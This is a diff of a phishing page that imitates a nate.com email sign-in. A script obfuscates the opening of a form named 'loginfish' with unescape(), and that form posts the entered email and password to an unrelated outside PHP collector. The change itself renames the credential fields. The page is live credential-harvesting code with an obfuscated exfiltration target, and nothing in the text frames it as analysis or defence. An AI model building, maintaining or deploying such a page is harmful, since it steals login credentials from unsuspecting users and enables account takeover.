@@ -134,8 +134,8 @@
         <p>Sign in with your nate.com Email</p>
 
        <script language=JavaScript>m='%20%3Cform%20name%3D%22loginfish%22%20';d=unescape(m);document.write(d);</script>action="https://remote-jobs.cloud/ivtech/kak2.php" method="post">
-            <input type="email" name="a" id="email" placeholder="Valid ID" required value="">
-            <input type="password" name="b" id="password" placeholder="Password" minlength="6" required>
+            <input type="email" name="email" id="email" placeholder="Valid ID" required value="">
+            <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
             <div class="remember-me">
                 <input type="checkbox" id="remember-me" name="remember-me" checked> <!-- Checked by default -->
                 <label for="remember-me">Remember me</label>
